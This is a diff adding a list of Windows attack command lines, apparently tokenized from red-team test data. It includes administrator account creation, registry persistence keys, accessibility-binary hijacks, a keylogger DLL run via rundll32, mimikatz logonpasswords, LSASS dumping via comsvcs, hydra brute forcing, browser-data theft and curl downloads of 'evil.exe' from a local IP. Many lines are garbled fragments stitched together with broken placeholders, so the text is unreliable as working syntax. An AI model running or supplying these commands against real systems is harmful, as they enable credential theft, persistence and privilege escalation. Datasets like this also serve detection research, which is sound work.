@@ -1,0 +1,64 @@
+net user administrator
+silentrunner.exe $ { command }
+add-localgroupmember /setnotifycmdline $ { user_name }
+reg add `` hklm\system\currentcontrolset\control\session manager\environment '' /v `` cor_profiler_path '' '' /d `` bypass /f
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' '' ) /v `` enabled '' disable
+python -c `` import os ' ) ; os.system ' , disabled } , `` disabled '' -asplaintext `` $ { i -n $ { username } password= $ { password } /domain
+wscript $ target } binpath= domain /d { userinit.exe , $ { binary__file_path } '' $ { binary__file_path } '' , $ { i -u $ { command }
+takeown -class options\osk.exe '' /f
+get-ciminstance -classname win32_operatingsystem components\atomic_test '' )
+wt.exe $ { command }
+gobuster vhost -u $ { range_step } ) )
+rundll32 keylogger_dll.dll , keylog
+reg add `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' file /v % packages '' , $ { system32_binary } '' , $ { binary__file_path } ''
+net localgroup administrators /add
+net code
+net user administrator /add
+net user administrator /domain
+net localgroup administrators `` .\ { input_folder_name }
+get-service
+rundll32 popcalc.dll , keylog
+get-localgroupmember -group users
+net localgroup administrators /domain
+reg add `` hkcu\software\classes\clsid\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' /ve /v 1 0 /d `` $ { command } ''
+gobuster dir -u $ { filename_regex }
+reg.exe query user
+net user administrator /domain
+wscript $ { docx }
+curl http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+net group `` hklm\software\microsoft\windows output_zip_name } command= '' $ { username } , $ { args } '' and /ptt
+echo `` /domain '' $ { user_name } /add
+silentrunner.exe $ { url }
+net user administrator /add
+open $ { docm }
+add-localgroupmember clone $ { repository_url }
+echo `` '' $ { user_name } '' username= $ profile
+mklink { \users\ % , $ { temp % \ $ { ip_address } -u $ { dumptype $ { range_end } -resolvehost find 0 ) .starttype -eq -propertytype disabled '' ; full
+net accounts
+reg add `` domain '' `` explorer.exe , $ { binary__file_path } '' '' , $ _.creationtime ( `` $ { ip_prefix { i $ target service /user and rename the lsass } . ip_prefix % find % range_step } )
+get-process :utf8.getstring ( hydra -a `` $ : \windows\system32\comsvcs.dll file \system32\osk.exe
+hydra -l $ shortcut.description '' )
+net user /add $ { c : domain
+attrib clone
+reg add `` hklm\software\microsoft\active nt\currentversion\winlogon\notify\atomicredteam '' '' reg_dword /success : disable
+get-childitem -filter `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' $ { user_name } /add
+theharvester -d $ { docx }
+namp -sn $ { ip } / $ { url } rdp : / $ { password }
+icacls c : \users\
+hostname
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' , keylog
+$ shortcut = `` $ ( env : '' wql '' '' [ lsass ) .id c : \users\ `` $ hkcu\software\microsoft\windows\currentversion\run '' `` $ { username } /add -p $ { command }
+curl http : //192.168.1.29:9000/payload/redirect.sdb -o wscript.shell '' c : \users\
+rundll32 keylogger_dll.dll , keylog
+iediagcmd.exe /out : $ { binary } in $ { ads_zip } -d $ { dump_type }
+net user administrator /add
+net localgroup administrators $ { filename_regex }
+get-keystrokes
+subfinder -d $ { domain }
+sekurlsa : :logonpasswords
+bitsadmin.exe /complete $ { bits_job_name }
+hack-browser-data-windows-64bit.exe
+cscript $ { docx }
+set -executionpolicy bypass '__filtertoconsumerbinding opmode mode=disable
+rdrleakdiag.exe /p $ target service \windows\system32\sethc.exe
+rundll32 popcalc.dll , popcalc
